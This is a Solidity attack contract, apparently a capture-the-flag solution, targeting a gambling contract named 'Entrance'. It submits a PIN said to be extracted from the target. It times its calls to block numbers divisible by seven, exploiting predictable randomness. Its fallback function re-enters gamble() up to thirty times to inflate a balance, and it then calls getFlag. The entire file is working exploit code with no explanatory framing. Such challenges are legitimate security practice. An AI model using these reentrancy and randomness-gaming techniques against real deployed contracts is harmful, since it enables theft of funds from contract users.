pragma solidity >=0.4.21;

import "./Entrance.sol"; //Contract at 0x1898Ed72826BEfa2D549004C57F048A95ae0B982
import "./SafeMath.sol"; //https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol

contract Entrance_Hack {
  using SafeMath for *;
  
  Entrance entrance;
  uint count = 0;

  constructor (address a) public {
    entrance = Entrance(a);
    entrance.enter(12341111); //Pin extracted from contract
  }

  function attack () public { //Call me to trigger attack
    require((block.number).mod(7) == 0); //Reject the function if the block number is not winning
    entrance.gamble();
  }

  function () external {
    count++;
    if(count < 30) //Increase this number to get more ponits
      entrance.gamble();
  }
  
  function getBalance () public view returns (uint256 balance) {
    return entrance.balanceOf(address(this));
  }
  
  function getFlag (string memory _server, string memory _port) public {
    entrance.getFlag(_server, _port);
  }
}